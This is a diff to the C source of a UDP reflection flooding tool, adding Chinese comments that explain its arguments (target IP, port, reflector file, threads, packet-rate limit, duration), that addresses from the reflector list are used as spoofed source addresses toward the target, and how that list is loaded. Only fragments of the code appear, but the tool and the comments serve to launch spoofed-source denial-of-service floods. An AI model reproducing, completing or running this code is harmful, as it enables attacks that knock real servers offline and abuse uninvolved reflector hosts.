@@ -11,6 +11,7 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <arpa/inet.h>
+// 命令行参数： 目的IP地址、 端口号、 反射文件、线程数、 PPS限制器、时间
 #define MAX_PACKET_SIZE 8192
 #define PHI 0x9e3779b9
 static uint32_t Q[4096], c = 362436;
@@ -120,7 +121,8 @@ void *flood(void *par1)
                 iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
                
                 pps++;
-                if(i >= limiter)
+                if(i >= limiter)                                        // list_node->data作为伪造的源地址，而iph->daddr是目标服务器的地址。
+                                                                        // 每次发送后，程序会更新链表节点指针list_node，以便下一个数据包使用下一个IP地址作为源地址。
                 {
                         i = 0;
                         usleep(sleeptime);
@@ -154,8 +156,8 @@ int main(int argc, char *argv[ ])
                         buffer[strlen(buffer) - 1] = 0x00;
                         if(head == NULL)
                         {
-                                head = (struct list *)malloc(sizeof(struct list));
-                                bzero(&head->data, sizeof(head->data));
+                                head = (struct list *)malloc(sizeof(struct list));                      // 读取命令行参数argv[3]指定的反射文件，该文件包含多个IP地址。每个IP地址被转换为网络字节序并存储在struct list结构的sin_addr.s_addr中。
+                                bzero(&head->data, sizeof(head->data));                                 // 这些结构被链接在一起形成一个双向链表，稍后用于发送数据包。
                                 head->data.sin_addr.s_addr=inet_addr(buffer);
                                 head->next = head;
                                 head->prev = head;
